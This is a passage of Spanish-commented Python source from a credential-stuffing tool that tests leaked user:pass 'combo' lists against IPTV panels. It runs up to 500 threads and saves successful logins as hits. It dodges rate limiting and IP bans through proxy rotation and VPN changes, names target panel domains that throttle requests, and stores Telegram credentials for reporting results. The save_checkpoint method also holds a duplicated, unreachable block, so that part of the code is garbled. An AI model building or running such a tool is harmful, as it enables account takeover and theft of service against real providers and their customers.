            self._cleanup_old_checkpoints()
        except Exception as e:

            if logger:
                logger.debug(f"No se pudo limpiar checkpoints: {e}")

    def _parse_combo_line(self, line):
        """
        Parsea una línea del combo soportando múltiples formatos:
        - user:pass
        - http://host:port:user:pass
        - host:port:user:pass

        Retorna: (user, password, host_from_line)
        """
        if not line or ':' not in line:
            return None, None, None

        parts = line.split(':')

        if len(parts) == 2:
            return parts[0].strip(), parts[1].strip(), None

        if len(parts) >= 4:

            if line.startswith('http://') or line.startswith('https://'):

                if len(parts) >= 5:
                    host = parts[1].replace('//', '')  
                    port = parts[2]
                    user = parts[3]
                    password = ':'.join(parts[4:])  

                    protocol = 'https' if line.startswith('https://') else 'http'
                    host_from_line = f"{protocol}://{host}:{port}"

                    return user.strip(), password.strip(), host_from_line
            else:

                host = parts[0]
                port = parts[1]
                user = parts[2]
                password = ':'.join(parts[3:])  

                host_from_line = f"http://{host}:{port}"

                return user.strip(), password.strip(), host_from_line

        if len(parts) == 3:

            return parts[0].strip(), parts[1].strip(), None

        return None, None, None

    def debug_proxy_status(self):
        """Función de debug para verificar el estado de los proxies"""
        print(f"\n{Colors.CYAN}=== DEBUG PROXY STATUS ==={Colors.RESET}")
        print(f"proxy_manager.enabled: {proxy_manager.enabled if proxy_manager else 'proxy_manager is None'}")

        if proxy_manager and proxy_manager.enabled:
            print(f"proxy_manager.active_proxies count: {len(proxy_manager.active_proxies)}")
            if proxy_manager.active_proxies:
                sample_proxy = proxy_manager.active_proxies[0]
                print(f"Primer proxy: {sample_proxy}")
                print(f"Proxy string: {proxy_manager._proxy_to_str(sample_proxy)}")

        print(f"self.current_proxy: {self.current_proxy}")
        print(f"=== FIN DEBUG ==={Colors.RESET}\n")

    def _mark_account_verified(self, user, password):
        """Marca una cuenta como verificada"""
        account_key = f"{user}:{password}"
        self.verified_accounts.add(account_key)

        self.retry_accounts.discard(account_key)

    def _is_account_verified(self, user, password):
        """Verifica si una cuenta ya fue procesada"""
        account_key = f"{user}:{password}"
        return account_key in self.verified_accounts

    def _mark_for_retry(self, user, password, index):
        """Marca una cuenta para reintento solo si no ha sido verificada"""
        account_key = f"{user}:{password}"

        if account_key not in self.verified_accounts:
            self.retry_accounts.add(account_key)
            if not self.processing_retries:  
                self.retry_queue.put(index)
            return True
        else:
            logger.debug(f"Cuenta {user} ya verificada, no se añade a retry")
            return False

    def _process_retries(self):
        """Procesa los reintentos con manejo inteligente de problemas"""
        if self.retry_queue.empty():
            return

        retry_size = self.retry_queue.qsize()
        logger.info(f"Procesando {retry_size} reintentos...")

        if proxy_manager.enabled:
            available_proxies = len([p for p in proxy_manager.active_proxies 
                                if not proxy_manager.is_bad_proxy(p)])

            if available_proxies < 5:  
                print(f"\n{Colors.YELLOW}⚠️  ADVERTENCIA: Solo {available_proxies} proxies funcionales disponibles{Colors.RESET}")
                print(f"{Colors.YELLOW}Los reintentos podrían fallar por falta de proxies estables{Colors.RESET}")

                choice = input(f"{Colors.YELLOW}¿Continuar con reintentos limitados? (s/n): {Colors.RESET}").lower()
                if choice != 's':
                    print(f"{Colors.CYAN}Saltando procesamiento de reintentos por decisión del usuario{Colors.RESET}")
                    self._handle_skipped_retries(retry_size)
                    return

        temp_retries = []

        while not self.retry_queue.empty():
            try:
                index = self.retry_queue.get(timeout=0.1)
                temp_retries.append(index)
                self.retry_queue.task_done()
            except queue.Empty:
                break

        logger.info(f"Se obtuvieron {len(temp_retries)} reintentos de la cola")

        if not temp_retries:
            return

        print(f"\n{Colors.YELLOW}Procesando {len(temp_retries)} reintentos con sistema optimizado...{Colors.RESET}")

        max_retry_workers = min(20, len(temp_retries))
        successful_retries = 0
        failed_retries = 0
        timeout_retries = 0

        def process_retry_worker(index):
            """Worker para procesar un reintento con mejor manejo de errores"""
            try:

                session = http_manager.create_session()

                if index >= len(self.combo_lines):
                    return {'status': 'invalid_index', 'index': index}

                line = self.combo_lines[index]
                if ':' not in line:
                    session.close()
                    return {'status': 'invalid_format', 'index': index}

                user, password = line.split(':', 1)
                user = user.strip()
                password = password.strip()

                if self.credentials_processor:
                    user, password = self.credentials_processor(user, password)

                if proxy_manager.enabled:
                    proxy = proxy_manager.get_proxy()
                    if proxy:
                        try:
                            result = self._check_account(session, user, password, proxy)
                            if result['status'] != 'retry':
                                session.close()
                                return {'status': 'success', 'result': result, 'method': 'proxy'}
                        except Exception as e:
                            logger.debug(f"Error en reintento con proxy: {e}")

                try:
                    result = self._check_account(session, user, password, None)
                    session.close()

                    if result['status'] != 'retry':
                        return {'status': 'success', 'result': result, 'method': 'direct'}
                    else:
                        return {'status': 'failed', 'user': user, 'password': password}

                except Exception as e:
                    logger.debug(f"Error en reintento sin proxy: {e}")
                    session.close()
                    return {'status': 'timeout', 'user': user, 'password': password}

            except Exception as e:
                logger.debug(f"Error general procesando reintento {index}: {e}")
                return {'status': 'error', 'index': index, 'error': str(e)}

        start_time = time.time()
        max_retry_time = 300  

        with ThreadPoolExecutor(max_workers=max_retry_workers) as executor:
            futures = [executor.submit(process_retry_worker, index) for index in temp_retries]

            for future in concurrent.futures.as_completed(futures, timeout=max_retry_time):
                try:
                    result = future.result(timeout=30)  

                    if result['status'] == 'success':
                        self._process_retry_result(result['result'])
                        successful_retries += 1

                        if successful_retries % 10 == 0:
                            print(f"\r{Colors.GREEN}Reintentos procesados: {successful_retries}{Colors.RESET}", end='', flush=True)

                    elif result['status'] == 'failed':
                        failed_retries += 1
                    elif result['status'] == 'timeout':
                        timeout_retries += 1

                except concurrent.futures.TimeoutError:
                    timeout_retries += 1
                    logger.debug("Timeout en worker de reintento")
                except Exception as e:
                    failed_retries += 1
                    logger.debug(f"Error en future de reintento: {e}")

        total_processed = successful_retries + failed_retries + timeout_retries
        remaining_retries = len(temp_retries) - total_processed

        print(f"\n{Colors.CYAN}=== RESUMEN DE REINTENTOS ==={Colors.RESET}")
        print(f"{Colors.GREEN}[OK] Procesados exitosamente: {successful_retries}{Colors.RESET}")
        print(f"{Colors.RED}[FAIL] Fallidos: {failed_retries}{Colors.RESET}")
        print(f"{Colors.YELLOW}⏱ Timeouts: {timeout_retries}{Colors.RESET}")

        if remaining_retries > 0:
            print(f"{Colors.MAGENTA}⚠️  No procesados: {remaining_retries}{Colors.RESET}")
            self._handle_unprocessed_retries(remaining_retries, temp_retries[total_processed:])

        logger.info(f"Procesamiento de reintentos completado: {successful_retries} exitosos, {failed_retries} fallidos, {timeout_retries} timeouts")

    def _handle_skipped_retries(self, retry_count):
        """Maneja los reintentos que se saltaron por problemas de proxies"""
        print(f"\n{Colors.YELLOW}=== REINTENTOS NO PROCESADOS ==={Colors.RESET}")
        print(f"{Colors.RED}Se saltaron {retry_count} reintentos{Colors.RESET}")
        print(f"{Colors.YELLOW}Motivo: Insuficientes proxies funcionales{Colors.RESET}")
        print(f"{Colors.CYAN}Recomendación: Obtener proxies de mejor calidad y ejecutar nuevamente{Colors.RESET}")

        with self.lock:
            self.stats['retries_skipped'] = retry_count
            self.stats['skip_reason'] = 'Insufficient working proxies'

    def _handle_unprocessed_retries(self, count, unprocessed_indices):
        """Maneja los reintentos que no se pudieron procesar"""
        print(f"\n{Colors.YELLOW}=== REINTENTOS PENDIENTES ==={Colors.RESET}")
        print(f"{Colors.MAGENTA}{count} cuentas no se pudieron verificar{Colors.RESET}")

        if proxy_manager.enabled:
            working_proxies = len([p for p in proxy_manager.active_proxies 
                                if not proxy_manager.is_bad_proxy(p)])

            if working_proxies < 10:
                print(f"{Colors.RED}Motivo principal: Solo {working_proxies} proxies funcionales{Colors.RESET}")
                print(f"{Colors.CYAN}Solución: Obtener más proxies de calidad{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}Motivo: Timeouts o problemas de conectividad{Colors.RESET}")
                print(f"{Colors.CYAN}Solución: Intentar más tarde o verificar conexión{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}Motivo: Verificación sin proxies (limitaciones del servidor){Colors.RESET}")
            print(f"{Colors.CYAN}Solución: Usar proxies para evitar rate limiting{Colors.RESET}")

        self._save_pending_retries(unprocessed_indices)

        with self.lock:
            self.stats['retries_pending'] = count

    def _save_pending_retries(self, unprocessed_indices):
        """Guarda los reintentos pendientes para la próxima ejecución"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            pending_file = f"hits/pending_retries_{timestamp}.txt"

            with open(pending_file, 'w', encoding='utf-8') as f:
                f.write(f"# Reintentos pendientes - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Portal: {self.protocol}://{self.portal}\n")
                f.write(f"# Total pendientes: {len(unprocessed_indices)}\n\n")

                for index in unprocessed_indices:
                    if index < len(self.combo_lines):
                        line = self.combo_lines[index]
                        f.write(f"{line}\n")

            print(f"{Colors.GREEN}Reintentos pendientes guardados en: {pending_file}{Colors.RESET}")
            logger.info(f"Reintentos pendientes guardados en {pending_file}")

        except Exception as e:
            logger.error(f"Error guardando reintentos pendientes: {e}")

    def _process_retry_result(self, result):
        """Procesa el resultado de un reintento"""
        with self.lock:
            if result['status'] == 'hit':
                self.stats['hits'] += 1
                self.stats['checked'] += 1
                self.stats['checked_this_session'] += 1
                self._process_hit(result)
                self.retry_stats['resolved'] += 1
            elif result['status'] == 'custom':
                self.stats['custom'] += 1
                self.stats['checked'] += 1
                self.stats['checked_this_session'] += 1
                self.retry_stats['resolved'] += 1
            elif result['status'] == 'fail':
                self.stats['fails'] += 1
                self.stats['checked'] += 1
                self.stats['checked_this_session'] += 1
                self.retry_stats['resolved'] += 1
            else:

                self.retry_stats['failed'] += 1

    def _print_retry_stats(self):
        """Imprime estadísticas de retries en pantalla
        NOTA: Los retries NO se cuentan en 'checked', solo hits/fails/custom se cuentan
        """
        if self.retry_stats['attempts'] > 0:
            def write_line(y, text):
                sys.stdout.write(f"\033[{y};0H{text}\033[K")

            retry_info = f"{Colors.CYAN}Retries - Intentos: {Colors.YELLOW}{self.retry_stats['attempts']}"
            retry_info += f"{Colors.CYAN} Resueltos: {Colors.GREEN}{self.retry_stats['resolved']}"
            retry_info += f"{Colors.CYAN} Fallados: {Colors.RED}{self.retry_stats['failed']}{Colors.RESET}"
            write_line(42, retry_info)

    def _is_cache_valid(self, user):
        """Verifica si el cache del contenido del servidor es válido"""
        current_time = time.time()
        cache_age = current_time - self.server_content_cache['cache_time']

        def has_valid_content():
            live = self.server_content_cache.get('live_count')
            vod = self.server_content_cache.get('vod_count') 
            series = self.server_content_cache.get('series_count')
            categories = self.server_content_cache.get('categories')

            valid_live = live is not None and str(live).strip() not in ["", "?", "0"]
            valid_vod = vod is not None and str(vod).strip() not in ["", "?", "0"]
            valid_series = series is not None and str(series).strip() not in ["", "?", "0"]
            valid_categories = categories is not None and str(categories).strip() not in ["", "?"]

            return valid_live or valid_vod or valid_series or valid_categories

        return (
            cache_age < self.server_content_cache['cache_duration'] and
            self.server_content_cache['last_user'] == user and
            has_valid_content()
        )

    def _update_content_cache(self, user, live_count, vod_count, series_count, categories):

        def is_valid_data(value):
            """Verifica si un dato es válido (no vacío)"""
            if value is None:
                return False
            value_str = str(value).strip()
            return value_str != "" and value_str != "?" and value_str != "0"

        has_valid_data = (
            is_valid_data(live_count) or 
            is_valid_data(vod_count) or 
            is_valid_data(series_count) or
            (categories and categories.strip() and categories != "?")
        )

        if has_valid_data:
            self.server_content_cache.update({
                'live_count': live_count if is_valid_data(live_count) else None,
                'vod_count': vod_count if is_valid_data(vod_count) else None,
                'series_count': series_count if is_valid_data(series_count) else None,
                'categories': categories if (categories and categories.strip() and categories != "?") else None,
                'last_user': user,
                'cache_time': time.time()
            })

            if is_valid_data(live_count):
                self.global_live_count = live_count
            if is_valid_data(vod_count):
                self.global_vod_count = vod_count
            if is_valid_data(series_count):
                self.global_series_count = series_count
            if categories and categories.strip() and categories != "?":
                self.global_categories = categories

            logger.debug(f"Cache de contenido actualizado para {user}: Live={live_count}, VOD={vod_count}, Series={series_count}")
        else:
            logger.debug(f"No se actualizó el cache para {user} - datos vacíos o inválidos")

    def _get_cached_content(self):
        """Obtiene el contenido del cache si está disponible"""
        if self.server_content_cache['live_count'] is not None:
            return (
                self.server_content_cache['live_count'],
                self.server_content_cache['vod_count'],
                self.server_content_cache['series_count'],
                self.server_content_cache['categories']
            )
        return None, None, None, None

    def _detect_anti_spam_protection(self, response_history, domain):
        """Detecta si el servidor tiene protección anti-spam agresiva"""
        if not hasattr(self, '_anti_spam_domains'):
            self._anti_spam_domains = set()

        consecutive_403s = 0
        for response_code in response_history[-10:]:  
            if response_code == 403:
                consecutive_403s += 1
            else:
                break

        if consecutive_403s >= 3:
            self._anti_spam_domains.add(domain)
            logger.warning(f"Protección anti-spam detectada en {domain}")
            return True

        return domain in self._anti_spam_domains

    def _is_anti_spam_domain(self, domain):
        """Verifica si un dominio tiene protección anti-spam conocida"""
        anti_spam_domains = [
            'smarttvpanel.com',
            'castlempire.site'
        ]
        return any(known_domain in domain for known_domain in anti_spam_domains)

    def _check_special_domain(self, domain):
        """Verifica si el dominio requiere manejo especial"""
        special_domains = [
            "xyza.ltd:25461", "tv.proyectox.vip:8080",
            "castlempire.site", "smarttvpanel.com"
        ]

        for special in special_domains:
            if special in domain:
                return True
        return False

    def _is_rate_limited_domain(self, domain):
        """Verifica si un dominio está en la lista de dominios con rate limiting conocido"""
        if not hasattr(self, "rate_limited_domains"):
            self.rate_limited_domains = set()

            known_rate_limited = [
                "castlempire.site", 
                "xyza.ltd",
                "tv.proyectox.vip",
                "smarttvpanel.com"
            ]
            for d in known_rate_limited:
                self.rate_limited_domains.add(d)

        base_domain = domain.split(':')[0]
        return base_domain in self.rate_limited_domains

    def _add_rate_limited_domain(self, domain):
        """Añade un dominio a la lista de dominios con rate limiting"""
        if not hasattr(self, "rate_limited_domains"):
            self.rate_limited_domains = set()

        base_domain = domain.split(':')[0]
        self.rate_limited_domains.add(base_domain)
        logger.info(f"Dominio {base_domain} añadido a la lista de rate limiting")

    def _apply_smart_rate_limiting(self, domain):
        """Aplica rate limiting inteligente basado en el historial del dominio"""
        current_time = time.time()
        base_domain = domain.split(':')[0]

        if base_domain not in self.domain_request_history:
            self.domain_request_history[base_domain] = []

        history = self.domain_request_history[base_domain]

        history[:] = [t for t in history if current_time - t < 60]

        if len(history) > 10:  
            delay = min(3.0, len(history) * 0.1)  
        elif len(history) > 5:
            delay = 0.5
        else:
            delay = 0.1

        if self._is_rate_limited_domain(domain):
            delay = max(delay, 1.5)

        history.append(current_time)

        if delay > 0.1:
            time.sleep(delay)

    def save_checkpoint(self):

        try:
            checkpoint_dir = 'checkpoints'
            if not os.path.exists(checkpoint_dir):
                os.makedirs(checkpoint_dir)

            portal_name = self.portal.replace(':', '_').replace('.', '_')
            combo_name = os.path.basename(self.combo_file).split('.')[0] if self.combo_file else 'unknown'

            checkpoint_pattern = f"checkpoint_{portal_name}_{combo_name}_"
            for old_checkpoint in os.listdir(checkpoint_dir):
                if old_checkpoint.startswith(checkpoint_pattern) and old_checkpoint.endswith('.json'):
                    old_path = os.path.join(checkpoint_dir, old_checkpoint)
                    try:
                        os.remove(old_path)
                        logger.debug(f"Checkpoint antiguo eliminado: {old_checkpoint}")
                    except:
                        pass

            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
            checkpoint_file = os.path.join(checkpoint_dir, f"checkpoint_{portal_name}_{combo_name}_{timestamp_str}.json")

            current_position = self.stats['checked'] + self.start_position

            checkpoint_data = {

                'portal': self.portal,
                'protocol': self.protocol,
                'combo_file': self.combo_file,

                'position': current_position,
                'start_position': self.start_position,
                'stats': self.stats.copy(),

                'get_categories': self.get_categories,
                'thread_count': self.thread_count,
                'location': self.location if hasattr(self, 'location') else "",

                'use_telegram': telegram_manager.enabled if 'telegram_manager' in globals() else False,
                'telegram_token': telegram_manager.token if 'telegram_manager' in globals() and telegram_manager.enabled else None,
                'telegram_chat_id': telegram_manager.chat_id if 'telegram_manager' in globals() and telegram_manager.enabled else None,

                'proxies_enabled': proxy_manager.enabled if 'proxy_manager' in globals() else False,
                'proxy_type': proxy_manager.proxy_type if 'proxy_manager' in globals() and proxy_manager.enabled else None,
                'proxy_file': proxy_manager.proxy_file if 'proxy_manager' in globals() and proxy_manager.enabled else None,

                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'duration': time.time() - self.start_time if self.start_time else 0,
                'total_lines': len(self.combo_lines) if self.combo_lines else 0,
                'progress_percentage': round((current_position / len(self.combo_lines) * 100), 2) if self.combo_lines and len(self.combo_lines) > 0 else 0,

                'retry_queue_size': self.retry_queue.qsize() if hasattr(self, 'retry_queue') else 0,
                'retry_stats': self.retry_stats.copy() if hasattr(self, 'retry_stats') else {},

                'verified_accounts_count': len(self.verified_accounts) if hasattr(self, 'verified_accounts') else 0,
                'ip_banned': self.ip_banned if hasattr(self, 'ip_banned') else False,

                'checkpoint_version': '2.0'
            }

            with open(checkpoint_file, 'w', encoding='utf-8') as f:
                json.dump(checkpoint_data, f, indent=4)

            logger.info(f"Checkpoint guardado: {checkpoint_file}")
            logger.info(f"Posición guardada: {current_position}/{checkpoint_data['total_lines']} ({checkpoint_data['progress_percentage']}%)")

            return True

        except Exception as e:
            logger.error(f"Error guardando checkpoint: {e}", exc_info=True)
            return False

            self._cleanup_old_checkpoints()

            return True
        except Exception as e:
            logger.error(f"Error guardando checkpoint: {e}")
            return False

    def _cleanup_old_checkpoints(self):
        """Elimina checkpoints con más de 3 días de antigüedad"""
        try:
            checkpoint_dir = 'checkpoints'
            if not os.path.exists(checkpoint_dir):
                return

            current_time = time.time()
            max_age_seconds = 3 * 24 * 60 * 60  
            cleaned_count = 0

            logger.debug("Iniciando limpieza de checkpoints antiguos...")

            for filename in os.listdir(checkpoint_dir):
                if filename.startswith('checkpoint_') and filename.endswith('.json'):
                    file_path = os.path.join(checkpoint_dir, filename)

                    try:

                        file_mod_time = os.path.getmtime(file_path)
                        file_age = current_time - file_mod_time

                        if file_age > max_age_seconds:
                            os.remove(file_path)
                            cleaned_count += 1
                            days_old = file_age / (24 * 60 * 60)
                            logger.info(f"Checkpoint eliminado (antigüedad: {days_old:.1f} días): {filename}")

                    except Exception as e:
                        logger.debug(f"Error procesando checkpoint {filename}: {e}")

            if cleaned_count > 0:
                logger.info(f"Limpieza completada: {cleaned_count} checkpoints antiguos eliminados")
            else:
                logger.debug("No hay checkpoints antiguos para eliminar")

        except Exception as e:
            logger.error(f"Error durante limpieza de checkpoints: {e}")

    def load_checkpoint(self, checkpoint_file, reset_stats=False):

        try:
            if not os.path.exists(checkpoint_file):
                logger.error(f"Archivo de checkpoint no encontrado: {checkpoint_file}")
                return False

            with open(checkpoint_file, 'r', encoding='utf-8') as f:
                checkpoint_data = json.load(f)

            checkpoint_version = checkpoint_data.get('checkpoint_version', '1.0')
            logger.info(f"Cargando checkpoint versión {checkpoint_version}")

            self.portal = checkpoint_data.get('portal', '')
            self.protocol = checkpoint_data.get('protocol', 'http')
            self.combo_file = checkpoint_data.get('combo_file', '')

            if reset_stats:

                self.start_position = 0
                self.stats = {
                    'total': 0,
                    'checked': 0,
                    'checked_this_session': 0,
                    'hits': 0,
                    'fails': 0,
                    'custom': 0,
                    'retries': 0,
                    'remaining': 0
                }
                logger.info("Modo: Empezar desde el principio - Stats reseteadas")
            else:

                self.start_position = checkpoint_data.get('position', checkpoint_data.get('start_position', 0))
                saved_stats = checkpoint_data.get('stats', {})

                self.stats = {
                    'total': saved_stats.get('total', 0),
                    'checked': self.start_position,  
                    'checked_this_session': 0,  
                    'hits': saved_stats.get('hits', 0),
                    'fails': saved_stats.get('fails', 0),
                    'custom': saved_stats.get('custom', 0),
                    'retries': saved_stats.get('retries', 0),
                    'remaining': saved_stats.get('remaining', 0)
                }

                self._loading_from_checkpoint = True
                logger.info(f"Modo: Continuar desde posición {self.start_position}")

            self.get_categories = checkpoint_data.get('get_categories', False)
            self.thread_count = checkpoint_data.get('thread_count', 1)
            self.location = checkpoint_data.get('location', "")

            use_telegram = checkpoint_data.get('use_telegram', False)
            if use_telegram and 'telegram_manager' in globals():
                telegram_token = checkpoint_data.get('telegram_token')
                telegram_chat_id = checkpoint_data.get('telegram_chat_id')

                if telegram_token and telegram_chat_id:
                    logger.info("Restaurando configuración de Telegram desde checkpoint")
                    telegram_manager.token = telegram_token
                    telegram_manager.chat_id = telegram_chat_id
                    telegram_manager.enabled = True
                else:
                    logger.warning("Checkpoint tiene Telegram habilitado pero sin credenciales válidas")

            if not self._load_combo():
                logger.error("No se pudo cargar el archivo combo")
                return False

            self.stats['total'] = len(self.combo_lines)
            logger.info(f"Total de líneas del combo establecido: {self.stats['total']}")

            if self.start_position > self.stats['total']:
                logger.warning(f"start_position ({self.start_position}) excede total de líneas ({self.stats['total']}). Ajustando.")
                self.start_position = self.stats['total']
                self.stats['checked'] = self.start_position
                self.stats['remaining'] = 0

            if checkpoint_data.get('proxies_enabled', False) and 'proxy_manager' in globals():
                proxy_file = checkpoint_data.get('proxy_file')
                proxy_type = checkpoint_data.get('proxy_type')

                if proxy_file and proxy_type and os.path.exists(proxy_file):
                    logger.info(f"Restaurando configuración de proxies: {proxy_type} desde {proxy_file}")
                    proxy_manager.load_proxies_from_file(proxy_file, proxy_type)
                else:
                    logger.warning("Checkpoint tiene proxies habilitados pero archivo no encontrado")

            total_lines = checkpoint_data.get('total_lines', len(self.combo_lines))
            progress_pct = checkpoint_data.get('progress_percentage', 0) if not reset_stats else 0

            print(f"\n{Colors.GREEN}{'='*70}{Colors.RESET}")
            print(f"{Colors.GREEN}{Colors.BOLD}✓ CHECKPOINT CARGADO EXITOSAMENTE{Colors.RESET}")
            print(f"{Colors.GREEN}{'='*70}{Colors.RESET}")
            print(f"{Colors.CYAN}Modo:{Colors.RESET} {'Empezar desde el principio' if reset_stats else 'Continuar desde donde quedó'}")
            print(f"{Colors.CYAN}Portal:{Colors.RESET} {self.portal}")
            print(f"{Colors.CYAN}Combo:{Colors.RESET} {os.path.basename(self.combo_file)}")

            if reset_stats:
                print(f"{Colors.CYAN}Posición:{Colors.RESET} {Colors.YELLOW}0/{total_lines} (0.0%) - REINICIADO{Colors.RESET}")
                print(f"{Colors.CYAN}Estadísticas:{Colors.RESET} {Colors.YELLOW}TODAS RESETEADAS{Colors.RESET}")
            else:
                print(f"{Colors.CYAN}Progreso guardado:{Colors.RESET} {self.start_position}/{total_lines} ({progress_pct}%)")
                print(f"{Colors.CYAN}Hits encontrados:{Colors.RESET} {self.stats['hits']}")
                print(f"{Colors.CYAN}Fails detectados:{Colors.RESET} {self.stats['fails']}")
                print(f"{Colors.CYAN}Custom status:{Colors.RESET} {self.stats['custom']}")

            print(f"{Colors.CYAN}Threads configurados:{Colors.RESET} {self.thread_count}")
            print(f"{Colors.CYAN}Categorías:{Colors.RESET} {'Sí' if self.get_categories else 'No'}")
            print(f"{Colors.CYAN}Proxies:{Colors.RESET} {'Sí (' + checkpoint_data.get('proxy_type', '') + ')' if checkpoint_data.get('proxies_enabled') else 'No'}")
            print(f"{Colors.CYAN}Telegram:{Colors.RESET} {'Sí' if use_telegram else 'No'}")
            print(f"{Colors.CYAN}Timestamp:{Colors.RESET} {checkpoint_data.get('timestamp', 'Desconocido')}")
            print(f"{Colors.GREEN}{'='*70}{Colors.RESET}\n")

            logger.info(f"Checkpoint cargado exitosamente. {'Reiniciando desde posición 0' if reset_stats else f'Reanudando desde posición {self.start_position}'}")
            return True

        except json.JSONDecodeError as e:
            logger.error(f"Error al parsear JSON del checkpoint: {e}")
            print(f"{Colors.RED}Error: El archivo de checkpoint está corrupto o no es válido{Colors.RESET}")
            return False
        except KeyError as e:
            logger.error(f"Error: Falta campo requerido en checkpoint: {e}")
            print(f"{Colors.RED}Error: El checkpoint está incompleto (falta campo: {e}){Colors.RESET}")
            return False
        except IndexError as e:
            logger.error(f"Error al cargar el archivo de combo: {e}", exc_info=True)
            print(f"{Colors.RED}Error: La posición del checkpoint excede el tamaño del combo actual{Colors.RESET}")
            return False
        except Exception as e:
            logger.error(f"Error cargando checkpoint: {e}", exc_info=True)
            print(f"{Colors.RED}Error inesperado al cargar checkpoint: {e}{Colors.RESET}")
            return False

    def _periodic_checkpoint_thread(self):
        """Hilo que guarda checkpoints periódicamente"""
        checkpoint_interval = 300  
        last_checkpoint_time = time.time()

        while self.running:
            current_time = time.time()

            if current_time - last_checkpoint_time >= checkpoint_interval:

                self.save_checkpoint()
                last_checkpoint_time = current_time

            time.sleep(10)  

    def _pause_for_ip_change(self):
        """Pausa el script y espera a que el usuario cambie su IP/VPN"""
        try:
            print(f"\n\n{Colors.RED}{Colors.BOLD}╔{'═' * 78}╗{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}║{' ' * 78}║{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}║{' ' * 15}🚨 IP BANEADA - ACCIÓN REQUERIDA 🚨{' ' * 22}║{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}║{' ' * 78}║{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}╚{'═' * 78}╝{Colors.RESET}")
            print(f"\n{Colors.YELLOW}El servidor ha bloqueado tu IP después de múltiples errores 403/429.{Colors.RESET}")
            print(f"{Colors.YELLOW}Todas las cuentas pendientes están marcadas como RETRY (no como fail).{Colors.RESET}")
            print(f"{Colors.GREEN}Se ha guardado un checkpoint automático para continuar después.{Colors.RESET}")

            retry_count = self.retry_queue.qsize() if hasattr(self, 'retry_queue') else 0
            if retry_count > 0:
                print(f"\n{Colors.CYAN}📊 Estadísticas:{Colors.RESET}")
                print(f"{Colors.YELLOW}  • Cuentas en cola de retry: {retry_count}{Colors.RESET}")
                print(f"{Colors.YELLOW}  • Estas cuentas se verificarán después de cambiar IP{Colors.RESET}")

            print(f"\n{Colors.CYAN}OPCIONES DISPONIBLES:{Colors.RESET}")
            print(f"{Colors.GREEN}  Opción 1: Cambiar IP/VPN{Colors.RESET}")
            print(f"{Colors.WHITE}    1. Cambia tu IP usando tu VPN{Colors.RESET}")
            print(f"{Colors.WHITE}    2. Verifica que tu nueva IP esté activa{Colors.RESET}")
            print(f"{Colors.WHITE}    3. Presiona ENTER para continuar{Colors.RESET}")

            print(f"\n{Colors.GREEN}  Opción 2: Usar Proxies (RECOMENDADO){Colors.RESET}")
            print(f"{Colors.WHITE}    1. Presiona Ctrl+C para detener el script{Colors.RESET}")
            print(f"{Colors.WHITE}    2. Reinicia con proxies habilitados{Colors.RESET}")
            print(f"{Colors.WHITE}    3. El checkpoint te permitirá continuar desde donde quedaste{Colors.RESET}")

            self.save_checkpoint()
            print(f"\n{Colors.GREEN}✓ Checkpoint guardado exitosamente{Colors.RESET}")

            input(f"\n{Colors.YELLOW}Presiona ENTER cuando hayas cambiado tu IP/VPN (o Ctrl+C para salir): {Colors.RESET}")

            if hasattr(self, '_403_count'):
                self._403_count.clear()

            self.ip_banned = False
            self.ip_banned_message = ""

            print(f"\n{Colors.GREEN}✓ Continuando verificación con IP renovada...{Colors.RESET}\n")
            time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}Detenido por el usuario. Puedes reanudar usando el checkpoint guardado.{Colors.RESET}")
            raise
        except Exception as e:
            logger.error(f"Error en pausa de IP: {e}")

    def _check_ip_ban(self, response, host):
        """Detecta IP baneada:  ignora Cloudflare si JSON válido"""
        try:
            if not response: 
                return False

            if hasattr(response, 'status_code'):

                if response.status_code == 429:
                    logger.warning(f"Rate limiting detectado en {host}")
                    with self.lock:
                        self.ip_banned = True
                        self.ip_banned_time = time.time()
                        self.ip_banned_message = f"⚠️ RATE LIMITING EN {host}"
                    return True

                if response.status_code == 403:
                    if not hasattr(self, '_403_count'):
                        self._403_count = {}

                    if host not in self._403_count:
                        self._403_count[host] = 1
                    else:
                        self._403_count[host] += 1

                    if self._403_count. get(host, 0) > 5:
                        logger. warning(f"IP baneada detectada en {host}")
                        with self.lock:
                            self.ip_banned = True
                            self.ip_banned_time = time.time()
                            self.ip_banned_message = f"⚠️ IP BANEADA EN {host}"
                        return True
                else:

                    if hasattr(self, '_403_count') and host in self._403_count:
                        self._403_count[host] = 0

            return False

        except: 
            return False  

    def _print_combo_info(self, start_line=2):
        """Imprime información sobre el combo en uso"""
        def write_line(y, text):
            sys.stdout.write(f"\033[{y};0H{text}\033[K")

        write_line(start_line + 7, f"{Colors.WHITE} Combo en uso: {Colors.YELLOW}{os.path.basename(self.combo_file)}{Colors.RESET}")

    def setup(self):
        """Configura los parámetros del verificador"""

        self.location = geo_manager.get_location()

        self.use_telegram = telegram_manager.setup()

        print(f"\n{Colors.CYAN}Selección de combo{Colors.RESET}")
        combo_source = input(f"{Colors.YELLOW}¿Desea usar combo existente (E) o generado (G)? {Colors.RESET}").upper()

        if combo_source == 'G':
            combo_maker = ComboMaker()
            self.combo_file = combo_maker.generate_combo_menu()
            if not self.combo_file:
                return False
        else:
            self.combo_file = self._select_combo_file()
            if not self.combo_file:
                return False

        if not self._load_combo():
            return False

        self._setup_credentials_processor()

        if not self._setup_portal():
            return False

        self.get_categories = input(f"\n{Colors.YELLOW}¿Incluir la lista de categorías de canales? (s/n): {Colors.RESET}").lower() == 's'

        global global_get_categories
        global_get_categories = self.get_categories

        try:
            thread_count = int(input(f"\n{Colors.YELLOW}Especifique el número de bots (1-500): {Colors.RESET}"))
            self.thread_count = max(1, min(500, thread_count))
        except:
            self.thread_count = 1

        use_proxies = input(f"\n{Colors.YELLOW}¿Quiere usar proxies? (s/n, RECOMENDADO): {Colors.RESET}").lower() == 's'

        if use_proxies:
            proxy_file, proxy_type = proxy_manager.show_proxy_menu()
            if proxy_file and proxy_type:
                proxy_manager.load_proxies_from_file(proxy_file, proxy_type)

        return True

